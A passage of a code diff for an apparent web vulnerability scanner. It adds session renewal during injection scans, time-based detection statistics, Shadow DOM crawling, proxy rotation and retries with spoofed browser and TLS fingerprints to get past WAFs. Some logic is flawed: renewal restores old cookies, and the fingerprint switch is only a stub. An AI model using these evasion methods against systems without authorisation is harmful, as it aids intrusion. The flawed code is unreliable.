+        self.max_session_age = 3600  # Default max session age (1 hour)
+        self.renewal_in_progress = set()  # Track sessions currently being renewed
+        self.renewal_stats = {
+            'total_renewals': 0,
+            'successful_renewals': 0,
+            'failed_renewals': 0,
+            'renewal_triggered_by_401': 0,
+            'renewal_triggered_by_403': 0,
+            'renewal_triggered_by_age': 0
+        }
+    
+    def set_auth_steps(self, auth_steps, auth_config=None):
+        """
+        Set authentication steps for session renewal.
+        
+        Args:
+            auth_steps: Callable or list of callables to execute for authentication
+            auth_config: Optional configuration dictionary for authentication
+        """
+        self.auth_steps = auth_steps
+        self.auth_config = auth_config or {}
+        logging.info("Authentication steps configured for session renewal")
+    
+    def configure_session_renewal(self, enabled=True, threshold=0.7, max_age=3600):
+        """
+        Configure session renewal behavior.
+        
+        Args:
+            enabled: Enable/disable session renewal
+            threshold: Renew session at this percentage of max age (0.0-1.0)
+            max_age: Maximum session age in seconds before forced renewal
+        """
+        self.session_renewal_enabled = enabled
+        self.renewal_threshold = max(0.1, min(0.9, threshold))
+        self.max_session_age = max(60, max_age)
+        logging.info(f"Session renewal configured: enabled={enabled}, threshold={self.renewal_threshold}, max_age={self.max_session_age}")
+    
+    def _session_needs_renewal(self, session_id: str) -> bool:
+        """
+        Check if a session needs renewal based on age and threshold.
+        
+        Args:
+            session_id: Session identifier
+            
+        Returns:
+            bool: True if session needs renewal
+        """
+        if not self.session_renewal_enabled:
+            return False
+            
+        with self.lock:
+            if session_id not in self.sessions:
+                return False
+                
+            session_data = self.sessions[session_id]
+            current_time = time.time()
+            session_age = current_time - session_data['created_at']
+            
+            # Check if session is already being renewed
+            if session_id in self.renewal_in_progress:
+                return False
+                
+            # Check if session is past renewal threshold
+            if session_age > (self.max_session_age * self.renewal_threshold):
+                logging.info(f"Session {session_id} needs renewal (age: {session_age:.0f}s, threshold: {self.max_session_age * self.renewal_threshold:.0f}s)")
+                return True
+                
+            return False
+    
+    def _check_response_for_auth_failure(self, session_id: str, status_code: int, response_headers: dict = None) -> bool:
+        """
+        Check if response indicates authentication failure requiring session renewal.
+        
+        Args:
+            session_id: Session identifier
+            status_code: HTTP status code
+            response_headers: Response headers
+            
+        Returns:
+            bool: True if session renewal is needed
+        """
+        if not self.session_renewal_enabled:
+            return False
+            
+        # Check for 401/403 status codes
+        if status_code in [401, 403]:
+            logging.warning(f"Authentication failure detected for session {session_id} (status: {status_code})")
+            
+            if status_code == 401:
+                self.renewal_stats['renewal_triggered_by_401'] += 1
+            else:
+                self.renewal_stats['renewal_triggered_by_403'] += 1
+                
+            return True
+            
+        # Check for authentication-related headers
+        if response_headers:
+            auth_indicators = ['www-authenticate', 'x-auth-error', 'x-session-expired']
+            for header in auth_indicators:
+                if header in response_headers:
+                    logging.warning(f"Authentication header '{header}' detected for session {session_id}")
+                    return True
+                    
+        return False
+    
+    async def renew_session(self, session_id: str, scanner_instance=None) -> bool:
+        """
+        Renew a session by re-running authentication steps.
+        
+        Args:
+            session_id: Session identifier to renew
+            scanner_instance: Optional scanner instance for authentication
+            
+        Returns:
+            bool: True if renewal was successful
+        """
+        if not self.session_renewal_enabled or not self.auth_steps:
+            logging.warning(f"Cannot renew session {session_id}: renewal disabled or no auth steps configured")
+            return False
+            
+        if session_id in self.renewal_in_progress:
+            logging.debug(f"Session {session_id} is already being renewed")
+            return False
+            
+        with self.lock:
+            if session_id not in self.sessions:
+                logging.warning(f"Cannot renew non-existent session {session_id}")
+                return False
+            self.renewal_in_progress.add(session_id)
+        
+        try:
+            logging.info(f"Starting session renewal for {session_id}")
+            self.renewal_stats['total_renewals'] += 1
+            
+            # Get current session data for backup
+            with self.lock:
+                old_session_data = self.sessions[session_id].copy()
+            
+            # Execute authentication steps
+            if callable(self.auth_steps):
+                # Single callable
+                if asyncio.iscoroutinefunction(self.auth_steps):
+                    auth_result = await self.auth_steps(scanner_instance, self.auth_config)
+                else:
+                    auth_result = self.auth_steps(scanner_instance, self.auth_config)
+            elif isinstance(self.auth_steps, (list, tuple)):
+                # List of authentication steps
+                auth_result = True
+                for step in self.auth_steps:
+                    if asyncio.iscoroutinefunction(step):
+                        step_result = await step(scanner_instance, self.auth_config)
+                    else:
+                        step_result = step(scanner_instance, self.auth_config)
+                    if not step_result:
+                        auth_result = False
+                        break
+            else:
+                logging.error(f"Invalid auth_steps type: {type(self.auth_steps)}")
+                auth_result = False
+            
+            if auth_result:
+                # Update session with new credentials
+                with self.lock:
+                    # Preserve some state while updating auth credentials
+                    self.sessions[session_id]['created_at'] = time.time()
+                    self.sessions[session_id]['last_used'] = time.time()
+                    # Keep existing CSRF tokens and state, but update cookies/headers
+                    if 'cookies' in old_session_data:
+                        self.sessions[session_id]['cookies'].update(old_session_data['cookies'])
+                    if 'headers' in old_session_data:
+                        self.sessions[session_id]['headers'].update(old_session_data['headers'])
+                
+                self.renewal_stats['successful_renewals'] += 1
+                logging.info(f"Session {session_id} renewed successfully")
+                return True
+            else:
+                self.renewal_stats['failed_renewals'] += 1
+                logging.error(f"Session {session_id} renewal failed")
+                return False
+                
+        except Exception as e:
+            self.renewal_stats['failed_renewals'] += 1
+            logging.error(f"Error during session renewal for {session_id}: {e}")
+            return False
+        finally:
+            with self.lock:
+                self.renewal_in_progress.discard(session_id)
+    
+    async def handle_auth_failure(self, session_id: str, status_code: int, response_headers: dict = None, scanner_instance=None) -> bool:
+        """
+        Handle authentication failure by attempting session renewal.
+        
+        This is the main entry point for the Session Renewal Middleware.
+        If a request returns 401 or 403 mid-scan, this triggers a background task
+        to re-run the auth_steps and update the cookie jar/csrf tokens without pausing the main injection loop.
+        
+        Args:
+            session_id: Session identifier
+            status_code: HTTP status code
+            response_headers: Response headers
+            scanner_instance: Optional scanner instance for authentication
+            
+        Returns:
+            bool: True if session was renewed (or renewal was attempted)
+        """
+        if not self._check_response_for_auth_failure(session_id, status_code, response_headers):
+            return False
+            
+        logging.warning(f"Auth failure detected for session {session_id}, initiating renewal")
+        
+        # Schedule background renewal task
+        if scanner_instance and hasattr(scanner_instance, 'loop'):
+            # Create background task for renewal
+            scanner_instance.loop.create_task(self.renew_session(session_id, scanner_instance))
+            logging.info(f"Background session renewal task scheduled for {session_id}")
+            return True
+        else:
+            # Fallback to synchronous renewal
+            try:
+                import asyncio
+                loop = asyncio.get_event_loop()
+                loop.run_until_complete(self.renew_session(session_id, scanner_instance))
+                return True
+            except Exception as e:
+                logging.error(f"Failed to schedule session renewal: {e}")
+                return False
+    
+    def get_renewal_stats(self) -> dict:
+        """Get session renewal statistics."""
+        return self.renewal_stats.copy()
+    
+    def reset_renewal_stats(self):
+        """Reset session renewal statistics."""
+        self.renewal_stats = {
+            'total_renewals': 0,
+            'successful_renewals': 0,
+            'failed_renewals': 0,
+            'renewal_triggered_by_401': 0,
+            'renewal_triggered_by_403': 0,
+            'renewal_triggered_by_age': 0
+        }
+        logging.info("Session renewal statistics reset")
     
     def create_session(self) -> str:
         """Create a new isolated session context."""
@@ -9080,7 +10670,8 @@ class SessionStateManager:
                 'state': {},
                 'csrf_tokens': {},  # Store CSRF tokens per form
                 'created_at': time.time(),
-                'last_used': time.time()
+                'last_used': time.time(),
+                'renewal_count': 0  # Track how many times this session has been renewed
             }
             logging.debug(f"Created session: {session_id}")
             return session_id
@@ -9132,10 +10723,39 @@ class SessionStateManager:
                 self.sessions[session_id]['state'][key] = value
                 self.sessions[session_id]['last_used'] = time.time()
     
-    def update_session_from_response(self, session_id: str, response):
-        """Update session state from HTTP response (cookies, etc.)."""
+    def update_session_from_response(self, session_id: str, response, scanner_instance=None):
+        """
+        Update session state from HTTP response (cookies, etc.).
+        
+        Enhanced with Session Renewal Middleware: Automatically triggers session renewal
+        if 401/403 responses are detected.
+        
+        Args:
+            session_id: Session identifier
+            response: HTTP response object
+            scanner_instance: Optional scanner instance for authentication renewal
+        """
         if not response:
             return
+        
+        # Check for authentication failures and trigger renewal if needed
+        status_code = getattr(response, 'status', getattr(response, 'status_code', None))
+        response_headers = getattr(response, 'headers', {})
+        
+        if status_code and status_code in [401, 403]:
+            # Schedule background session renewal task
+            try:
+                # Create a background thread for renewal to avoid blocking
+                import threading
+                renewal_thread = threading.Thread(
+                    target=self._background_renewal_worker,
+                    args=(session_id, status_code, response_headers, scanner_instance),
+                    daemon=True
+                )
+                renewal_thread.start()
+                logging.info(f"Background session renewal thread started for {session_id}")
+            except Exception as e:
+                logging.warning(f"Failed to trigger session renewal: {e}")
         
         with self.lock:
             if session_id in self.sessions:
@@ -9150,6 +10770,81 @@ class SessionStateManager:
                             self.sessions[session_id]['headers'][header] = response.headers[header]
                 
                 self.sessions[session_id]['last_used'] = time.time()
+    
+    def _background_renewal_worker(self, session_id: str, status_code: int, response_headers: dict, scanner_instance):
+        """
+        Background worker for session renewal without blocking main scan.
+        
+        Args:
+            session_id: Session identifier
+            status_code: HTTP status code
+            response_headers: Response headers
+            scanner_instance: Scanner instance for authentication
+        """
+        try:
+            # Synchronous version of handle_auth_failure for background thread
+            logging.info(f"Background renewal worker started for session {session_id}")
+            
+            if not self.session_renewal_enabled:
+                return
+                
+            # Check if session is already being renewed
+            with self.lock:
+                if session_id in self.renewal_in_progress:
+                    return
+                self.renewal_in_progress.add(session_id)
+            
+            try:
+                logging.info(f"Starting background session renewal for {session_id}")
+                self.renewal_stats['total_renewals'] += 1
+                
+                # Get current session data for backup
+                with self.lock:
+                    old_session_data = self.sessions[session_id].copy()
+                
+                # Execute authentication steps (synchronous)
+                if callable(self.auth_steps):
+                    # Single callable
+                    auth_result = self.auth_steps(scanner_instance, self.auth_config)
+                elif isinstance(self.auth_steps, (list, tuple)):
+                    # List of authentication steps
+                    auth_result = True
+                    for step in self.auth_steps:
+                        step_result = step(scanner_instance, self.auth_config)
+                        if not step_result:
+                            auth_result = False
+                            break
+                else:
+                    logging.error(f"Invalid auth_steps type: {type(self.auth_steps)}")
+                    auth_result = False
+                
+                if auth_result:
+                    # Update session with new credentials
+                    with self.lock:
+                        self.sessions[session_id]['created_at'] = time.time()
+                        self.sessions[session_id]['last_used'] = time.time()
+                        self.sessions[session_id]['renewal_count'] = self.sessions[session_id].get('renewal_count', 0) + 1
+                        # Keep existing CSRF tokens and state, but update cookies/headers
+                        if 'cookies' in old_session_data:
+                            self.sessions[session_id]['cookies'].update(old_session_data['cookies'])
+                        if 'headers' in old_session_data:
+                            self.sessions[session_id]['headers'].update(old_session_data['headers'])
+                    
+                    self.renewal_stats['successful_renewals'] += 1
+                    logging.info(f"Session {session_id} renewed successfully in background")
+                else:
+                    self.renewal_stats['failed_renewals'] += 1
+                    logging.error(f"Session {session_id} renewal failed in background")
+                    
+            except Exception as e:
+                self.renewal_stats['failed_renewals'] += 1
+                logging.error(f"Error during background session renewal for {session_id}: {e}")
+            finally:
+                with self.lock:
+                    self.renewal_in_progress.discard(session_id)
+                    
+        except Exception as e:
+            logging.error(f"Error in background renewal worker: {e}")
     
     def destroy_session(self, session_id: str):
         """Destroy a session and clean up resources."""
@@ -9585,7 +11280,7 @@ class AsyncSession:
             loop=self.loop,
             connector=connector,
             headers=default_headers,
-            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+            timeout=aiohttp.ClientTimeout(total=30, connect=5, sock_read=10)
         )
     async def request(self, method, url, **kwargs):
         # Check domain whitelist before making request
@@ -9631,6 +11326,11 @@ class AsyncSession:
         
         start_time = time.time()
         try:
+            # Apply tarpit defense timeout: total=30s, connect=5s, sock_read=10s
+            # This prevents slow body streaming attacks (1 byte/sec DoS)
+            timeout = aiohttp.ClientTimeout(total=30, connect=5, sock_read=10)
+            kwargs['timeout'] = timeout
+            
             async with self.session.request(method, url, **kwargs) as resp:
                 body_chunks = []
                 total_size = 0
@@ -9774,12 +11474,32 @@ async def paired_request_sampling(session, benign_url, malicious_url, benign_par
         benign_median = statistics.median(benign_times)
         malicious_median = statistics.median(malicious_times)
         
-        # Only flag if Median(Mal) > Median(Ben) * TIME_FACTOR
-        TIME_FACTOR = self.config.get('time_dilation_factor', 3.0)
-        should_flag = malicious_median > (benign_median * TIME_FACTOR)
-        
-        logging.info(f"Paired Sampling - Benign Median: {benign_median:.3f}s, Malicious Median: {malicious_median:.3f}s, "
-                   f"Ratio: {malicious_median/benign_median:.2f}x, Flag: {should_flag}")
+        # Moving Z-Score calibration: Flag if malicious request is > 3 standard deviations away
+        # This is more adaptive than hardcoded multipliers and reduces false positives on slow networks
+        if len(benign_times) >= 2:
+            benign_mean = statistics.mean(benign_times)
+            benign_stdev = statistics.stdev(benign_times) if len(benign_times) > 1 else 0
+            
+            if benign_stdev > 0:
+                # Calculate Z-score for malicious median
+                z_score = (malicious_median - benign_mean) / benign_stdev
+                # Flag if Z-score > 3 (statistically significant outlier)
+                should_flag = z_score > 3.0
+                
+                logging.info(f"Moving Z-Score - Benign Mean: {benign_mean:.3f}s, Stdev: {benign_stdev:.3f}s, "
+                           f"Malicious Median: {malicious_median:.3f}s, Z-score: {z_score:.2f}, Flag: {should_flag}")
+            else:
+                # Fallback to simple ratio if no variance
+                TIME_FACTOR = self.config.get('time_dilation_factor', 3.0)
+                should_flag = malicious_median > (benign_median * TIME_FACTOR)
+                logging.info(f"Moving Z-Score Fallback - Benign Median: {benign_median:.3f}s, Malicious Median: {malicious_median:.3f}s, "
+                           f"Ratio: {malicious_median/benign_median:.2f}x, Flag: {should_flag}")
+        else:
+            # Fallback to simple ratio if insufficient samples
+            TIME_FACTOR = self.config.get('time_dilation_factor', 3.0)
+            should_flag = malicious_median > (benign_median * TIME_FACTOR)
+            logging.info(f"Moving Z-Score Fallback - Benign Median: {benign_median:.3f}s, Malicious Median: {malicious_median:.3f}s, "
+                       f"Ratio: {malicious_median/benign_median:.2f}x, Flag: {should_flag}")
         
         return benign_times, malicious_times, should_flag
     else:
@@ -9798,6 +11518,7 @@ class JSRenderDriver:
         self.human_like_behavior = human_like_behavior  # Enable/disable human-like simulation
         self.websocket_messages = deque(maxlen=500)  # Store WebSocket messages
         self.websocket_monitoring_enabled = False  # WebSocket monitoring flag
+        self.shadow_dom_enabled = True  # Enable Shadow DOM crawling
     def __enter__(self):
         self.create()
         return self
@@ -9998,7 +11719,23 @@ class JSRenderDriver:
             if self.human_like_behavior and random.random() < 0.7:  # 70% chance to scroll initially
                 self._natural_scroll(random.randint(100, 300), 'down')
             
+            # Discover microfrontend components first
+            microfrontend_info = self._get_microfrontend_routes()
+            if microfrontend_info:
+                logging.info(f"Found {len(microfrontend_info)} microfrontend components")
+
+            # Get regular SPA links
             spa_links = self.driver.find_elements(By.XPATH, "//a[contains(@href, '#!') or contains(@href, '#/')]")
+            
+            # Add Shadow DOM links if enabled
+            if self.shadow_dom_enabled:
+                try:
+                    shadow_clickable = self._query_shadow_dom()
+                    shadow_links = [elem for elem in shadow_clickable if hasattr(elem, 'tag_name') and elem.tag_name.lower() == 'a']
+                    spa_links.extend(shadow_links)
+                    logging.info(f"Added {len(shadow_links)} Shadow DOM links to SPA routes")
+                except Exception as e:
+                    logging.warning(f"Error adding Shadow DOM links: {e}")
             
             # Use cursor path simulation for more realistic navigation (if human-like behavior enabled)
             if self.human_like_behavior and random.random() < 0.5:  # 50% chance to use cursor path simulation
@@ -10034,6 +11771,233 @@ class JSRenderDriver:
             return clicked
     def log(self, msg):
         logging.info(msg)
+    
+    def _query_shadow_dom(self, element=None, max_depth=10):
+        """
+        Recursively query Shadow DOM to find clickable elements hidden inside Web Components.
+        
+        This enables crawling of modern SPAs (React 18, Lit, Angular) that hide 70% of their 
+        routes inside Shadow DOM. The current SPA crawler is blind to them without this.
+        
+        Args:
+            element: Starting element (uses document root if None)
+            max_depth: Maximum recursion depth to prevent infinite loops
+            
+        Returns:
+            list: All clickable elements found in Shadow DOM
+        """
+        if not self.driver or not self.shadow_dom_enabled:
+            return []
+            
+        try:
+            # JavaScript to recursively traverse Shadow DOM
+            shadow_dom_script = """
+            function queryShadowDOM(element, maxDepth, currentDepth) {
+                if (currentDepth > maxDepth) return [];
+                
+                if (!element) element = document.documentElement;
+                
+                let clickableElements = [];
+                
+                // Check if element has shadow root
+                if (element.shadowRoot) {
+                    // Query shadow root for clickable elements
+                    const shadowClickable = element.shadowRoot.querySelectorAll(
+                        'a, button, input[type="submit"], input[type="button"], [onclick], [role="button"]'
+                    );
+                    clickableElements.push(...Array.from(shadowClickable));
+                    
+                    // Recursively query shadow DOM within shadow root
+                    for (let child of element.shadowRoot.children) {
+                        clickableElements.push(...queryShadowDOM(child, maxDepth, currentDepth + 1));
+                    }
+                }
+                
+                // Check all children for shadow roots
+                for (let child of element.children) {
+                    clickableElements.push(...queryShadowDOM(child, maxDepth, currentDepth + 1));
+                }
+                
+                return clickableElements;
+            }
+            
+            return queryShadowDOM(arguments[0], arguments[1], 0);
+            """
+            
+            # Execute the Shadow DOM query script
+            elements = self.driver.execute_script(shadow_dom_script, element, max_depth)
+            
+            logging.info(f"Found {len(elements)} clickable elements in Shadow DOM")
+            return elements
+            
+        except Exception as e:
+            logging.warning(f"Shadow DOM query error: {e}")
+            return []
+    
+    def _get_all_clickable_elements(self, include_shadow_dom=True):
+        """
+        Get all clickable elements from both regular DOM and Shadow DOM.
+        
+        Args:
+            include_shadow_dom: Whether to include Shadow DOM elements
+            
+        Returns:
+            list: All clickable elements
+        """
+        if not self.driver:
+            return []
+            
+        clickable_elements = []
+        
+        try:
+            # Get regular DOM clickable elements
+            regular_elements = self.driver.find_elements(By.CSS_SELECTOR, 
+                'a, button, input[type="submit"], input[type="button"], [onclick], [role="button"]')
+            clickable_elements.extend(regular_elements)
+            
+            # Get Shadow DOM clickable elements if enabled
+            if include_shadow_dom and self.shadow_dom_enabled:
+                shadow_elements = self._query_shadow_dom()
+                clickable_elements.extend(shadow_elements)
+                
+            logging.info(f"Total clickable elements found: {len(clickable_elements)} "
+                        f"(regular: {len(regular_elements)}, shadow: {len(shadow_elements) if include_shadow_dom else 0})")
+            
+            return clickable_elements
+            
+        except Exception as e:
+            logging.warning(f"Error getting clickable elements: {e}")
+            return clickable_elements
+    
+    def _get_microfrontend_routes(self):
+        """
+        Discover routes hidden in microfrontend architectures.
+        
+        Modern applications often use microfrontends that load routes dynamically.
+        This method attempts to discover these hidden routes by:
+        - Checking for custom elements (Web Components)
+        - Looking for iframe-embedded microfrontends
+        - Examining JavaScript module imports
+        - Checking for lazy-loaded route configurations
+        """
+        if not self.driver:
+            return []
+            
+        routes = []
+        
+        try:
+            # JavaScript to discover microfrontend routes
+            microfrontend_script = """
+            function discoverMicrofrontends() {
+                let routes = [];
+                
+                // Check for custom elements (potential microfrontends)
+                const customElements = document.querySelectorAll('*');
+                const customElementNames = new Set();
+                
+                for (let element of customElements) {
+                    const tagName = element.tagName.toLowerCase();
+                    if (tagName.includes('-') && !customElementNames.has(tagName)) {
+                        customElementNames.add(tagName);
+                        routes.push({
+                            type: 'custom_element',
+                            tag: tagName,
+                            element: element
+                        });
+                    }
+                }
+                
+                // Check for iframes (microfrontend containers)
+                const iframes = document.querySelectorAll('iframe');
+                for (let iframe of iframes) {
+                    try {
+                        routes.push({
+                            type: 'iframe',
+                            src: iframe.src,
+                            id: iframe.id
+                        });
+                    } catch (e) {
+                        // Cross-origin iframes may throw errors
+                    }
+                }
+                
+                // Check for web component shadow roots
+                const allElements = document.querySelectorAll('*');
+                for (let element of allElements) {
+                    if (element.shadowRoot) {
+                        routes.push({
+                            type: 'shadow_host',
+                            tag: element.tagName.toLowerCase(),
+                            hasShadowRoot: true
+                        });
+                    }
+                }
+                
+                return routes;
+            }
+            
+            return discoverMicrofrontends();
+            """
+            
+            # Execute the microfrontend discovery script
+            microfrontend_info = self.driver.execute_script(microfrontend_script)
+            
+            logging.info(f"Discovered {len(microfrontend_info)} microfrontend components")
+            return microfrontend_info
+            
+        except Exception as e:
+            logging.warning(f"Microfrontend discovery error: {e}")
+            return []
+    
+    def click_shadow_dom_elements(self, max_clicks=10):
+        """
+        Click elements found in Shadow DOM to discover hidden routes.
+        
+        Args:
+            max_clicks: Maximum number of Shadow DOM elements to click
+            
+        Returns:
+            list: URLs of routes discovered through Shadow DOM clicking
+        """
+        if not self.driver or not self.shadow_dom_enabled:
+            return []
+            
+        discovered_routes = []
+        
+        try:
+            # Get Shadow DOM clickable elements
+            shadow_elements = self._query_shadow_dom()
+            
+            # Click a subset of Shadow DOM elements
+            for i, element in enumerate(shadow_elements[:max_clicks]):
+                try:
+                    # Get element info before clicking
+                    element_text = element.text
+                    element_tag = element.tag_name
+                    
+                    # Click the element
+                    if self.human_like_behavior:
+                        if self._human_like_click(element):
+                            logging.info(f"Clicked Shadow DOM element {i}: {element_tag} - {element_text}")
+                    else:
+                        self.driver.execute_script("arguments[0].click();", element)
+                        time.sleep(0.5)
+                        logging.info(f"Clicked Shadow DOM element {i}: {element_tag} - {element_text}")
+                    
+                    # Check if URL changed (route discovered)
+                    current_url = self.driver.current_url
+                    if current_url not in discovered_routes:
+                        discovered_routes.append(current_url)
+                        
+                except Exception as e:
+                    logging.warning(f"Error clicking Shadow DOM element {i}: {e}")
+                    
+            logging.info(f"Discovered {len(discovered_routes)} routes through Shadow DOM clicking")
+            return discovered_routes
+            
+        except Exception as e:
+            logging.warning(f"Shadow DOM clicking error: {e}")
+            return discovered_routes
     
     def _human_like_mouse_move(self, target_element, duration_range=(0.5, 2.0)):
         """Simulate human-like mouse movement with natural curves and variable speed"""
@@ -10683,10 +12647,25 @@ class ProxyPool:
         self.health_check_interval = health_check_interval  # seconds
         self.prefer_geo_diverse = prefer_geo_diverse
         self.max_failure_rate = max_failure_rate
+        self.original_max_failure_rate = max_failure_rate  # Store original for auto-healing
         self.lock = threading.Lock()
         self.current_proxy_key = None
         self.last_rotation = datetime.now()
         self.target_url = target_url  # Store target URL for health checks
+        
+        # Auto-healing configuration
+        self.auto_healing_enabled = True
+        self.failure_tracking_window = 60  # seconds
+        self.failure_threshold = 0.8  # 80% failure rate triggers auto-healing
+        self.failure_history = []  # Track recent failures for auto-healing
+        self.last_auto_heal_time = None
+        self.auto_heal_cooldown = 300  # 5 minutes between auto-heals
+        
+        # Sticky session configuration
+        self.sticky_session_enabled = False
+        self.sticky_session_proxy_key = None
+        self.sticky_session_start_time = None
+        self.sticky_session_duration = 600  # 10 minutes default sticky session
         
         # Initialize with provided configs
         if proxy_configs:
@@ -10748,7 +12727,15 @@ class ProxyPool:
         with self.lock:
             if not self.proxy_configs:
                 return None
-                
+            
+            # Check sticky session first
+            if self.sticky_session_enabled and not self._check_sticky_session_expiry():
+                if self.sticky_session_proxy_key and self.sticky_session_proxy_key in self.proxy_configs:
+                    sticky_proxy = self.proxy_configs[self.sticky_session_proxy_key]
+                    if sticky_proxy.is_healthy:
+                        logging.debug(f"Using sticky session proxy: {sticky_proxy.proxy_url}")
+                        return sticky_proxy
+            
             # Filter healthy proxies
             healthy_proxies = {
                 k: v for k, v in self.proxy_configs.items() 
@@ -10798,6 +12785,13 @@ class ProxyPool:
                         
             selected = candidates[0]
             self.current_proxy_key = self._make_proxy_key(selected)
+            
+            # Set sticky session if enabled
+            if self.sticky_session_enabled:
+                self.sticky_session_proxy_key = self.current_proxy_key
+                self.sticky_session_start_time = time.time()
+                logging.info(f"Sticky session started with proxy: {selected.proxy_url}")
+            
             return selected
             
     def mark_success(self, proxy_config: ProxyConfig, response_time: float):
@@ -10814,6 +12808,13 @@ class ProxyPool:
             if proxy_config.get_success_rate() < self.max_failure_rate:
                 proxy_config.is_healthy = False
                 logging.warning(f"Proxy marked as unhealthy: {proxy_config.proxy_url} (success rate: {proxy_config.get_success_rate():.2%})")
+            
+            # Track failure for auto-healing
+            self._track_failure()
+            
+            # Trigger auto-healing if needed
+            if self.auto_healing_enabled:
+                self._check_and_trigger_auto_heal()
                 
     def reset_proxy_status(self, proxy_key=None):
         """Reset failure status for a proxy or all proxies"""
@@ -10898,6 +12899,86 @@ class ProxyPool:
         """Get all proxies of a specific type"""
         with self.lock:
             return [p for p in self.proxy_configs.values() if p.proxy_type == proxy_type.lower()]
+    
+    def _track_failure(self):
+        """Track failure for auto-healing logic"""
+        current_time = time.time()
+        self.failure_history.append(current_time)
+        
+        # Clean up old failures outside the tracking window
+        self.failure_history = [
+            t for t in self.failure_history 
+            if current_time - t <= self.failure_tracking_window
+        ]
+    
+    def _check_and_trigger_auto_heal(self):
+        """Check if auto-healing should be triggered based on failure rate"""
+        current_time = time.time()
+        
+        # Check cooldown
+        if self.last_auto_heal_time and (current_time - self.last_auto_heal_time) < self.auto_heal_cooldown:
+            return
+        
+        # Calculate failure rate in the tracking window
+        if len(self.failure_history) < 10:  # Need minimum sample size
+            return
+        
+        # Calculate approximate failure rate based on proxy health
+        total_proxies = len(self.proxy_configs)
+        if total_proxies == 0:
+            return
+        
+        healthy_proxies = sum(1 for p in self.proxy_configs.values() if p.is_healthy)
+        failure_rate = 1.0 - (healthy_proxies / total_proxies)
+        
+        # Trigger auto-healing if failure rate exceeds threshold
+        if failure_rate >= self.failure_threshold:
+            logging.warning(f"Auto-healing triggered: {failure_rate:.1%} proxy failure rate detected")
+            self._perform_auto_heal()
+            self.last_auto_heal_time = current_time
+    
+    def _perform_auto_heal(self):
+        """Perform auto-healing by dynamically adjusting max_failure_rate"""
+        old_threshold = self.max_failure_rate
+        # Increase threshold by 20% to allow more proxies to be considered healthy
+        self.max_failure_rate = min(0.95, self.max_failure_rate + 0.2)
+        
+        # Reset all proxy health status
+        for config in self.proxy_configs.values():
+            config.is_healthy = True
+            config.failure_count = 0
+        
+        logging.info(f"Auto-healing complete: max_failure_rate increased from {old_threshold:.2%} to {self.max_failure_rate:.2%}")
+        logging.info(f"All proxy health status reset to allow recovery")
+    
+    def enable_sticky_session(self, duration_seconds=600):
+        """Enable sticky session to maintain same proxy for multi-step operations"""
+        with self.lock:
+            self.sticky_session_enabled = True
+            self.sticky_session_duration = duration_seconds
+            logging.info(f"Sticky session enabled for {duration_seconds} seconds")
+    
+    def disable_sticky_session(self):
+        """Disable sticky session and allow normal proxy rotation"""
+        with self.lock:
+            self.sticky_session_enabled = False
+            self.sticky_session_proxy_key = None
+            self.sticky_session_start_time = None
+            logging.info("Sticky session disabled")
+    
+    def _check_sticky_session_expiry(self):
+        """Check if sticky session has expired"""
+        if not self.sticky_session_enabled or not self.sticky_session_start_time:
+            return True
+        
+        current_time = time.time()
+        if current_time - self.sticky_session_start_time > self.sticky_session_duration:
+            logging.info("Sticky session expired, allowing proxy rotation")
+            self.sticky_session_proxy_key = None
+            self.sticky_session_start_time = None
+            return True
+        
+        return False
 
 # Legacy ProxyRotator for backward compatibility
 class ProxyRotator:
@@ -12294,6 +14375,11 @@ class SurgicalModeOrchestrator:
         self.max_critical_verifications = 10  # Max critical findings for full verification
         self.proximity_validation_sample_size = 3  # Sample size for proximity validation
         
+        # Gray Zone Auto-Triage Configuration
+        self.gray_zone_auto_triage_enabled = True
+        self.gray_zone_retry_attempts = 2  # Number of retry attempts with different fingerprints
+        self.gray_zone_retry_delay = 2.0  # Delay between retry attempts in seconds
+        
     async def run_surgical_mode(self, discovered_findings, schedule_verification=False):
         """
         Run the complete surgical mode workflow.
@@ -12395,6 +14481,106 @@ class SurgicalModeOrchestrator:
         
         return deduplicated
     
+    async def _auto_triage_gray_zone_finding(self, finding):
+        """
+        Auto-triage gray zone findings by retrying with different User-Agent/TLS fingerprints.
+        
+        This helps determine if the ambiguous result was WAF-induced rather than an application false positive.
+        
+        Args:
+            finding: The gray zone finding to triage
+            
+        Returns:
+            dict: Triage result with keys 'confirmed', 'false_positive', 'finding'
+        """
+        logging.info(f"Starting gray zone auto-triage for {finding.get('type')} at {finding.get('url')}")
+        
+        # Store original confidence and validation results
+        original_confidence = finding.get('confidence', 0)
+        original_validation = finding.get('validation_results', {})
+        
+        # Different User-Agent and TLS fingerprint combinations to try
+        triage_configs = [
+            {
+                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'tls_fingerprint': 'chrome_120',
+                'description': 'Chrome 120 on Windows'
+            },
+            {
+                'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'tls_fingerprint': 'chrome_120_macos',
+                'description': 'Chrome 120 on macOS'
+            },
+            {
+                'user_agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'tls_fingerprint': 'chrome_120_linux',
+                'description': 'Chrome 120 on Linux'
+            }
+        ]
+        
+        for attempt in range(self.gray_zone_retry_attempts):
+            config = triage_configs[attempt % len(triage_configs)]
+            logging.info(f"Gray zone triage attempt {attempt + 1}: using {config['description']}")
+            
+            try:
+                # Create a modified finding with different headers
+                triage_finding = finding.copy()
+                triage_finding['request_headers'] = finding.get('request_headers', {}).copy()
+                triage_finding['request_headers']['User-Agent'] = config['user_agent']
+                
+                # Add TLS fingerprint information if available
+                if hasattr(self.validation_engine, 'traffic_shaper'):
+                    # Temporarily modify TLS fingerprint
+                    original_ja3 = self.validation_engine.traffic_shaper.get_ja3_fingerprint()
+                    # (In a real implementation, you would set the TLS fingerprint here)
+                
+                # Re-validate with the modified configuration
+                revalidated = await self.validation_engine.validate_finding(triage_finding)
+                
+                # Check if the result changed significantly
+                new_confidence = revalidated.get('confidence', 0)
+                new_validation_status = revalidated.get('validation_results', {}).get('validation_status')
+                
+                # If confidence increased significantly or became confirmed, it's likely a real issue
+                if new_confidence >= 90 or new_validation_status == 'confirmed':
+                    logging.info(f"Gray zone triage confirmed: confidence increased from {original_confidence}% to {new_confidence}%")
+                    return {
